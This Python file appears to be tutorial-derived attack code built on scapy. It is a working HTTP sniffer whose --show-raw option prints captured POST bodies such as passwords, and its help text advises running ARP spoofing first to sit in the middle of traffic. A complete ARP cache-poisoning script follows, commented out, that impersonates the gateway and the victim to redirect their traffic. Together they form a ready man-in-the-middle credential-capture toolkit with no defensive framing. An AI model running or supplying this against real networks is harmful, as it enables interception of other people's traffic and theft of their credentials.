from scapy.all import *
from scapy.layers.http import HTTPRequest # import HTTP packet
from colorama import init, Fore

# initialize colorama
init()

# define colors
GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET


def sniff_packets(iface=None):
    """
    Sniff 80 port packets with `iface`, if None (default), then the
    scapy's default interface is used
    """
    if iface:
        # port 80 for http (generally)
        # `process_packet` is the callback
        sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
    else:
        # sniff with default interface
        sniff(filter="port 80", prn=process_packet, store=False)


def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    if packet.haslayer(HTTPRequest):
        # if this packet is an HTTP Request
        # get the requested URL
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        # get the requester's IP Address
        ip = packet[IP].src
        # get the request method
        method = packet[HTTPRequest].Method.decode()
        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
        if show_raw and packet.haslayer(Raw) and method == "POST":
            # if show_raw flag is enabled, has raw data, and the requested method is "POST"
            # then show raw
            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")

    # parse arguments
    args = parser.parse_args()
    iface = args.iface
    show_raw = args.show_raw

    sniff_packets(iface)






# from scapy.all import Ether, ARP, srp, send
# import argparse
# import time
# import os
# import sys

# def _enable_linux_iproute():
#     """
#     Enables IP route ( IP Forward ) in linux-based distro
#     """
#     file_path = "/proc/sys/net/ipv4/ip_forward"
#     with open(file_path) as f:
#         if f.read() == 1:
#             # already enabled
#             return
#     with open(file_path, "w") as f:
#         print(1, file=f)


# def _enable_windows_iproute():
#     """
#     Enables IP route (IP Forwarding) in Windows
#     """
#     from services import WService
#     # enable Remote Access service
#     service = WService("RemoteAccess")
#     service.start()


# def enable_ip_route(verbose=True):
#     """
#     Enables IP forwarding
#     """
#     if verbose:
#         print("[!] Enabling IP Routing...")
#     _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
#     if verbose:
#         print("[!] IP Routing enabled.")


# def get_mac(ip):
#     """
#     Returns MAC address of any device connected to the network
#     If ip is down, returns None instead
#     """
#     ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
#     if ans:
#         return ans[0][1].src
        

# def spoof(target_ip, host_ip, verbose=True):
#     """
#     Spoofs `target_ip` saying that we are `host_ip`.
#     it is accomplished by changing the ARP cache of the target (poisoning)
#     """
#     # get the mac address of the target
#     target_mac = get_mac(target_ip)
#     # craft the arp 'is-at' operation packet, in other words; an ARP response
#     # we don't specify 'hwsrc' (source MAC address)
#     # because by default, 'hwsrc' is the real MAC address of the sender (ours)
#     arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
#     # send the packet
#     # verbose = 0 means that we send the packet without printing any thing
#     send(arp_response, verbose=0)
#     if verbose:
#         # get the MAC address of the default interface we are using
#         self_mac = ARP().hwsrc
#         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


# def restore(target_ip, host_ip, verbose=True):
#     """
#     Restores the normal process of a regular network
#     This is done by sending the original informations 
#     (real IP and MAC of `host_ip` ) to `target_ip`
#     """
#     # get the real MAC address of target
#     target_mac = get_mac(target_ip)
#     # get the real MAC address of spoofed (gateway, i.e router)
#     host_mac = get_mac(host_ip)
#     # crafting the restoring packet
#     arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
#     # sending the restoring packet
#     # to restore the network to its normal process
#     # we send each reply seven times for a good measure (count=7)
#     send(arp_response, verbose=0, count=7)
#     if verbose:
#         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


# if __name__ == "__main__":
#     parser = argparse.ArgumentParser(description="ARP spoof script")
#     parser.add_argument("target", help="Victim IP Address to ARP poison")
#     parser.add_argument("host", help="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
#     parser.add_argument("-v", "--verbose", action="store_true", help="verbosity, default is True (simple message each second)")
#     args = parser.parse_args()
#     target, host, verbose = args.target, args.host, args.verbose

#     enable_ip_route()
#     try:
#         while True:
#             # telling the `target` that we are the `host`
#             spoof(target, host, verbose)
#             # telling the `host` that we are the `target`
#             spoof(host, target, verbose)
#             # sleep for one second
#             time.sleep(1)
#     except KeyboardInterrupt:
#         print("[!] Detected CTRL+C ! restoring the network, please wait...")
#         restore(target, host)
#         restore(host, target)